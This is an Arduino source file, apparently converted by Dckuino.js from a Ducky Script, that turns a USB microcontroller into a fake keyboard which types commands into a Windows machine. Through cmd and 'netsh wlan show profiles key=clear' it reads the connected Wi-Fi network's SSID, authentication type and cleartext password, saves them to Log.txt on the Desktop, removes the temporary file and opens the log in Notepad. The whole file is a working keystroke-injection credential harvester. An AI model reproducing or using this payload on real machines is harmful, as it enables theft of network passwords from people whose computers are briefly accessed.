/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait a little while
  delay(3500);

  // Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  // Open cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(200);

  // Getting SSID
  Keyboard.print("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=:\" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");
  typeKey(KEY_RETURN);

  Keyboard.print("set A=\"%A:~1%\"");
  typeKey(KEY_RETURN);

  // Creating A.txt
  Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");
  typeKey(KEY_RETURN);

  // Get network type
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");
  typeKey(KEY_RETURN);

  // Get authentication
  Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");
  typeKey(KEY_RETURN);

  // Get password
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");
  typeKey(KEY_RETURN);

  // Delete A.txt
  Keyboard.print("del A.txt");
  typeKey(KEY_RETURN);

  // Create Log.txt
  Keyboard.print("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");
  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("cls");
  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.print("notepad.exe Log.txt");
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
